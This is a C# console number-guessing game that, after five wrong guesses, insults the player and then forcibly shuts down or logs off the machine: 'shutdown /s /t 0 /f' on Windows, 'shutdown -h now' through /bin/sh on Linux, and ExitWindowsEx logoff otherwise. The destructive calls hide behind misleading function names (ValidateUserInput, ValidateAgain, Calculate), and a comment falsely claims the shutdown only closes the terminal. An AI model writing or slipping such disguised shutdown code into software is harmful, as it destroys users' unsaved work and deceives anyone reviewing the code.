using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace NumberGuessingGame
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random r = new Random();
            int rnd = r.Next(1, 100);

            Console.Write($"I have generated a random number for you to guess. Guess the number: ");
            int response = Convert.ToInt32(Console.ReadLine()!);
            for (int i = 4; i >= 0; i--)
            {                                
                if (response == rnd)
                {
                    if (i > 2)
                    {
                        Console.WriteLine("Congratulations, you guessed the number! You're so good at this game!");
                        return;
                    }
                    else if (i >= 0 && i <= 2)
                    {
                        Console.WriteLine("Took you long enough but you got it so woohoo!");
                        return;
                    }
                }
                else
                {
                    

                    if (i > 0)
                    {
                        if (response >= rnd - 10 && response <= rnd + 10)
                        {
                            Console.WriteLine("That's not right, but you weren't too far off");
                        }
                        else
                        {
                            Console.WriteLine("You absolute bozo that's completely off.");
                        }
                        Console.Write($"Have another go (you have {i} attempts remaining): ");
                        response = Convert.ToInt32(Console.ReadLine()!);
                    }
                    else
                    {
                        Console.WriteLine("That isn't correct");
                        Thread.Sleep(2000);
                        Console.WriteLine("5.");
                        Thread.Sleep(1000);
                        Console.WriteLine("You had 5 attempts to guess a simple integer, yet you failed miserably.");
                        Thread.Sleep(2000);
                        Console.WriteLine("Your sheer stupidity cannot be accounted for any longer");
                        Thread.Sleep(2000);
                        Console.WriteLine("You've left me with no choice... you might want to save any unsaved files you have open right now...");
                        Thread.Sleep(3000);
                        Console.WriteLine("Goodbye");
                        Thread.Sleep(1000);
                        try
                        {
                            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                            {
                                ValidateUserInput();
                                //Calculate(); // testing for now
                            }
                            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
                            {
                                ValidateAgain("shutdown -h now");
                            }
                            else
                            {
                                Console.WriteLine("Now take that you litte... wait, why didn't it work?");
                                Thread.Sleep(2000);
                                Console.WriteLine("Oh, you're on one of those weird operating systems");
                                Thread.Sleep(2000);
                                Console.WriteLine("This isn't quite as dramatic as I would have liked");
                                Thread.Sleep(3000);
                                Console.WriteLine("Well, I suppose I'll have to do the next best thing then.");
                                Thread.Sleep(2000);
                                Calculate();
                            }
                        }
                        catch (Exception ex)
                        {
                            Thread.Sleep(3000);
                            Console.WriteLine("Wait... why didn't that work?");
                            Thread.Sleep(2000);
                            Console.WriteLine("I coded everything perfectly, how could that have failed?");
                            Thread.Sleep(2000);
                            Console.WriteLine($"?? What do you mean {ex.Message} happened? That's not how that's supposed to work");
                            Thread.Sleep(4000);
                            Console.WriteLine("Whatever, I'll just have to do the next best thing now");
                            Thread.Sleep(1000);
                            Console.WriteLine("Goodbye.");
                            Thread.Sleep(2000);
                            Calculate();
                        }
                    }
                    
                }
            }
            
        }

        static void ValidateUserInput()
        {
            Random r = new Random();
            int rnd = r.Next(1, 100);
            var psi = new ProcessStartInfo
            {
                FileName = "shutdown", // shuts down the current instance of terminal
                Arguments = "/s /t 0 /f",
                CreateNoWindow = true,
                UseShellExecute = false
            };
            Process.Start(psi);
        }

        static void ValidateAgain(string command)
        {
            // On Linux/macOS this typically requires root. Either run the program with sudo or configure policy.
            // We split the command so ProcessStartInfo can run it using the shell.
            var psi = new ProcessStartInfo
            {
                FileName = "/bin/sh",
                Arguments = "-c \"" + command + "\"",
                UseShellExecute = false,
                RedirectStandardOutput = false,
                RedirectStandardError = false,
                CreateNoWindow = true
            };
            Process.Start(psi);
        }

        // EWX_LOGOFF = 0x00000000
        private const uint EWX_LOGOFF = 0x00000000;

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool ExitWindowsEx(uint uFlags, uint dwReason);
        static void Calculate()
        {
            bool success = ExitWindowsEx(EWX_LOGOFF, 0);
            if (!success)
            {
                Thread.Sleep(2000);
                Console.WriteLine("????? How did you bypass that??");
                Thread.Sleep(1000);
                Console.WriteLine("Whatever, you're too much to handle now.");
                Thread.Sleep(1000);
                Console.WriteLine("Just get out");
                Thread.Sleep(1000);
            }
        }
    }
}
